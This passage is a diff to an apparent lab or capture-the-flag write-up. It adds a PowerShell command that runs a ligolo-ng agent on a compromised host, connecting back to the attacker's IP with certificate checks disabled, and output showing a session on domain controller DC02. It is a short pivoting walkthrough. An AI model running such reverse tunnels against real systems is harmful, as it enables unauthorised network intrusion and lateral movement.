@@ -581,5 +581,15 @@ ligolo-ng »
 Ill start the proxy  on my machine
 
 ```python
+PS C:\Temp> ./agent.exe -connect 10.10.14.61:11601 --ignore-cert
+```
+
+Then on the shell on `dc02` ill trigger the connection back
+
+```python
+ligolo-ng » session
+? Specify a session : 1 - darkzero-ext\svc_sql@DC02 - 10.129.48.21:60783 - 00155df25c01
+[Agent : darkzero-ext\svc_sql@DC02] »
+
 
 ```
